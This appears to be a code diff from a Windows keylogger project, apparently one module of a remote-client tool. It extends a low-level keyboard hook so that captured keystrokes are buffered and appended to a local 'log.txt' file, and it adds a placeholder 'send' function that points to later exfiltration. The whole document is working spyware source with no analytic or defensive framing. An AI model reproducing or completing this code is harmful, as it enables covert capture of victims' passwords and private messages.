@@ -5,11 +5,93 @@
 #include <iostream>
 #include "Windows.h"
 #include <task\client_tasks\keylogger\key_constrants.h>
+#include <fstream>
+#include <mutex>
+#include <chrono>
+#include <functional>
+#include <condition_variable>
+
+#define MAX_SIZE_KEYLOG 10000
+#define FILE_NAME "log.txt"
 
 namespace keyhook {
-	std::string keylog{};
 
+	bool UninstallHook();
+
+	std::string keylog{};
 	HHOOK eHook = nullptr;
+
+	struct file_manager {
+		std::ofstream file_key;
+
+		std::string data;
+		std::string file_name = FILE_NAME;
+
+		bool running;
+
+		std::mutex mtx;
+
+		file_manager()
+		{}
+
+		void write_data(std::string keylog)
+		{
+			std::lock_guard<std::mutex> lock(mtx);
+			data = keylog;
+			write_file();
+		}
+
+		void write_file()
+		{
+			if (!file_key.is_open())
+				open_file();
+			file_key << data;
+			data.clear();
+			close_file();
+		}
+
+		void open_file()
+		{
+			file_key.open(file_name, std::ofstream::out | std::ofstream::app);
+		}
+
+		void send_data()
+		{
+			//send
+			// TODO waiting writing in file
+			if (data.size() > 0)
+				std::this_thread::sleep_for(
+					std::chrono::milliseconds(2000)
+				);
+
+			running = false;
+			data = "";
+		}
+		void close_file()
+		{
+			file_key.close();
+		}
+
+		std::string get_file_name()
+		{
+			return FILE_NAME;
+		}
+
+		static file_manager* get()
+		{
+			static file_manager* singleton = nullptr;
+			if (!singleton)
+				singleton = new file_manager();
+			return singleton;
+		}
+	};
+
+	void insert_data()
+	{
+		file_manager::get()->write_data(keylog);
+		keylog.clear();
+	}
+
 
 	LRESULT keyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 	{
@@ -21,6 +103,7 @@ namespace keyhook {
 			keylog += Keys::KEYS[kbs->vkCode].Name;
 			if (kbs->vkCode == VK_RETURN)
 				keylog += '\n';
+
 		}
 		else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
 		{
@@ -44,6 +127,12 @@ namespace keyhook {
 				keylog += keyName;
 			}
 		}
+		
+		if (keylog.size() > MAX_SIZE_KEYLOG)
+		{
+			insert_data();
+		}
+
 		return CallNextHookEx(eHook, nCode, wparam, lparam);
 	}
 
